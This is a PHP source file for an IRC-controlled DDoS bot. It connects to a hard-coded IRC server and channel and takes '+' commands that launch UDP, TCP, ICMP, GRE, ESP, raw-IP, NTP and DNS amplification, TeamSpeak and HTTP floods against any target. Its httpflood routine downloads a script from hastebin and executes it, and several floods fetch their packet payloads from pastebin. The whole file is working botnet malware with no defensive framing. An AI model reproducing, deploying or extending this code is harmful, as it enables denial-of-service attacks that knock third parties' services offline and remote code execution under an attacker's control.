<?php

ini_set('max_execution_time', 0);
error_reporting(0);
set_time_limit(0);

$ircServer = "176.127.69.56";
$ircPort = intval("6667");
$ircChannel = "#" . "theend";
$botTrigger = "+";
$botName = gethostname();
$ircSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
$success = NULL;
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

function httpflood ($host, $time, $threads)
{
	file_put_contents("flood.php", file_get_contents("https://hastebin.com/raw/johagiwaco"));

    for ($i = 0; $i < $threads; $i++)
        system ("php flood.php " . $host . " " . $time . " > /dev/null 2>&1 &");

	unlink("flood.php");
}

function espflood ($host, $time)
{
    $sock = socket_create(AF_INET, SOCK_RAW, 50);
    socket_connect($sock, $host, NULL);

    for ($i = 0, $end = (time() + $time); time() < $end; $i++) {
        $packet = chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr($i);
        socket_send($sock, $packet, strlen($packet), 0);
    }
}

function greflood ($host, $time)
{
    $packet = chr(0) . chr(0) . chr(8) . chr(0);
    $sock = socket_create(AF_INET, SOCK_RAW, 47);
    socket_connect($sock, $host, NULL);

    for ($end = (time() + $time); time() < $end;)
        socket_send($sock, $packet, strlen($packet), 0);

    socket_close($sock);
}

function icmpflood ($host, $time)
{
    $packet = "\x08\x00\x7d\x4b\x00\x00\x00\x00PingHost";
    $sock = socket_create(AF_INET, SOCK_RAW, 1);
    socket_set_option($sock, SOL_SOCKET, SO_RCVTIMEO, array('sec' => 5, 'usec' => 0));
    socket_connect($sock, $host, null);

    for ($end = (time() + $time); time() < $end;)
        socket_send($sock, $packet, strlen($packet), 0);

    socket_close($sock);
}

function ipflood ($host, $time)
{
    $packet = "";
    for ($i = 0; $i < 65535; $i++)
        $packet .= 'X';

    $port = mt_rand(1, 65535);
    $fp = fsockopen('udp://' . $host, $port, $errno, $errstr, 5);
    for ($end = (time() + $time); time() < $end;)
        fwrite($fp, $packet);

    fclose($fp);
}

function ntpflood ($host, $time, $data)
{
    $packets = array_map("base64_decode", explode("\n", file_get_contents($data))); // https://pastebin.com/raw/6tTzMxEM

    $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
    socket_bind($sock, "0.0.0.0", 123);
    socket_connect($sock, $host, 123);

    for ($end = (time() + $time); time() < $end;)
        foreach ($packets as $packet)
            socket_send($sock, $packet, strlen($packet), 0);

    socket_close($sock);
}

function dnsflood ($host, $time, $data)
{
    $packets = array_map("base64_decode", explode("\n", file_get_contents($data))); // https://pastebin.com/raw/YdTcyZtH

    $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
    socket_bind($sock, "0.0.0.0", 53);
    socket_connect($sock, $host, mt_rand(1024, 65535));

    for ($end = (time() + $time); time() < $end;)
        foreach ($packets as $packet)
            socket_send($sock, $packet, strlen($packet), 0);

    socket_close($sock);
}

function teamspeak ($host, $port, $time, $conn, $data)
{
    $conn = array_map("base64_decode", explode("\n", file_get_contents($conn))); // https://pastebin.com/raw/qQpyg3Dm
    $data = array_map("base64_decode", explode("\n", file_get_contents($data))); // https://pastebin.com/raw/Y5eYe0hN

    $found = preg_grep("/( ip=)/", $conn);
    $conn[key($found)] .= $host;

    $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
    socket_connect($sock, $host, $port);

    foreach ($conn as $packet) {
        socket_send($sock, $packet, strlen($packet), 0);
        usleep(18500);
    }

    for ($end = time() + $time; $end > time();)
        foreach ($data as $packet)
            socket_send($sock, $packet, strlen($packet), 0);

    socket_close($sock);
}

function tcpflood ($host, $port, $time, $size)
{
    GLOBAL $chars;
    $packet = "";
    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

    $data = substr(str_shuffle($chars), 0, 5);

    while (strlen($packet) < $size)
        $packet .= $data;

    $packet = substr($packet, 0, $size);


    socket_set_option($sock, SOL_SOCKET, SO_SNDTIMEO, array('sec' => 5, 'usec' => 0));
    socket_connect($sock, $host, $port);
    for ($end = (time() + $time); time() < $end;)
        socket_send($sock, $packet, strlen($packet), 0);

    socket_close($sock);
}

function bandwidth ($host, $port, $time)
{
    GLOBAL $chars;
    $packet = "";
    $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);

    while (strlen($packet) < 1024)
        $packet .= substr(str_shuffle($chars), 0, 1);

    $len = strlen($packet);
    socket_connect($sock, $host, $port);

    for ($end = (time() + $time); time() < $end;)
        socket_send($sock, $packet, $len, 0);

    socket_close($sock);
}

function udpflood ($host, $port, $time, $size, $content)
{
    GLOBAL $chars;
    $data = substr(str_shuffle($chars), 0, 5);
    $packet = "";
    $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);


    if (!isset($content))
        while (strlen($packet) < $size)
            $packet .= $data;
    else
        while (strlen($packet) < $size)
            $packet .= $content;

    $packet = substr($packet, 0, $size);
    socket_connect($socket, $host, $port);

    for ($end = (time() + $time); time() < $end;)
        socket_send($socket, $packet, strlen($packet), 0);

    socket_close($socket);
}

function buildHelp ($ircChannel)
{
    $text = "PRIVMSG " . $ircChannel . " :##########################  Help command  ##########################\n";
    $text .= "PRIVMSG " . $ircChannel . " :- udpflood [IP] [PORT] [TIME] [SIZE] (CONTENT)\n";
    $text .= "PRIVMSG " . $ircChannel . " :- teamspeak [IP] [PORT] [TIME] [CONNECTION PACKETS] [DATA PACKETS]\n";
    $text .= "PRIVMSG " . $ircChannel . " :- bandwidth [IP] [PORT] [TIME]\n";
    $text .= "PRIVMSG " . $ircChannel . " :- tcpflood [IP] [PORT] [TIME] [SIZE]\n";
    $text .= "PRIVMSG " . $ircChannel . " :- dnsflood [IP] [TIME] [DATA PACKETS]\n";
    $text .= "PRIVMSG " . $ircChannel . " :- ntpflood [IP] [TIME] [DATA PACKETS]\n";
    $text .= "PRIVMSG " . $ircChannel . " :- ipflood [IP] [TIME]\n";
    $text .= "PRIVMSG " . $ircChannel . " :- icmpflood [IP] [TIME]\n";
	$text .= "PRIVMSG " . $ircChannel . " :- greflood [IP] [TIME]\n";
	$text .= "PRIVMSG " . $ircChannel . " :- espflood [IP] [TIME]\n";
	$text .= "PRIVMSG " . $ircChannel . " :- httpflood [HOST] [TIME] [THREADS]\n";
    $text .= "PRIVMSG " . $ircChannel . " :####################################################################\n";
    return $text;
}

if (socket_connect($ircSocket, $ircServer, $ircPort)) {

    $message = "USER " . $botName . " local.net ~ bot\n";
    socket_write($ircSocket, $message, strlen($message));
    $message = "NICK " . $botName . " \n";
    socket_write($ircSocket, $message, strlen($message));
    $message = "JOIN " . $ircChannel . "\n";
    socket_write($ircSocket, $message, strlen($message));

    while ($data = socket_read($ircSocket, 256)) {

        if (strpos($data, 'PRIVMSG') !== FALSE) {
            $message = explode(":", explode("PRIVMSG", $data)[1], 2)[1];
            $fchar = substr($message, 0, 1);

            if ($fchar == $botTrigger) {
                $args = explode(" ", substr($message, 1));
                foreach ($args as &$arg) {
                    $arg = trim($arg);
                }

                switch ($args[0]) {
                    case "die":
                        socket_close($ircSocket);
                        exit();
                    case "help":
                        $message = buildHelp($ircChannel);
                        socket_write($ircSocket, $message, strlen($message));
                        break;
                    case "teamspeak":
                        if (count($args) == 6) {
                            teamspeak($args[1], intval($args[2]), intval($args[3]), $args[4], $args[5]);
                            $success = "true";
                        } else
                            $success = "false";
                        break;
                    case "icmpflood":
                        if (count($args) == 3) {
                            icmpflood($args[1], intval($args[2]));
                            $success = "true";
                        } else
                            $success = "false";
                        break;
					case "greflood":
                        if (count($args) == 3) {
                            greflood($args[1], intval($args[2]));
                            $success = "true";
                        } else
                            $success = "false";
                        break;
                    case "bandwidth":
                        if (count($args) == 4) {
                            bandwidth($args[1], intval($args[2]), intval($args[3]));
                            $success = "true";
                        } else
                            $success = "false";
                        break;
                    case "dnsflood":
                        if (count($args) == 4) {
                            dnsflood($args[1], intval($args[2]), $args[3]);
                            $success = "true";
                        } else
                            $success = "false";
                        break;
                    case "ntpflood":
                        if (count($args) == 4) {
                            ntpflood($args[1], intval($args[2]), $args[3]);
                            $success = "true";
                        } else
                            $success = "false";
                        break;
					case "httpflood":
                        if (count($args) == 4) {
                            httpflood($args[1], intval($args[2]), intval($args[3]));
                            $success = "true";
                        } else
                            $success = "false";
                        break;
					case "espflood":
                        if (count($args) == 3) {
                            espflood($args[1], intval($args[2]));
                            $success = "true";
                        } else
                            $success = "false";
                        break;
                    case "ipflood":
                        if (count($args) == 3) {
                            ipflood($args[1], intval($args[2]));
                            $success = "true";
                        } else
                            $success = "false";
                        break;
                    case "tcpflood":
                        if (count($args) == 5) {
                            tcpflood($args[1], intval($args[2]), intval($args[3]), intval($args[4]));
                            $success = "true";
                        } else
                            $success = "false";
                        break;
                    case "udpflood":
                        if (count($args) >= 5) {
                            udpflood($args[1], intval($args[2]), intval($args[3]), intval($args[4]), $args[5]);
                            $success = "true";
                        } else
                            $success = "false";
                        break;
                    default:
                        break;
                }

                if ($success == "true")
                    socket_write($ircSocket, "PRIVMSG " . $ircChannel . " :Successfully executed the command.\n");
                elseif ($success == "false")
                    socket_write($ircSocket, "PRIVMSG " . $ircChannel . " :Wrong usage for this command. Try +help for further information.\n");

                $success = NULL;
            }
        }
    }
}
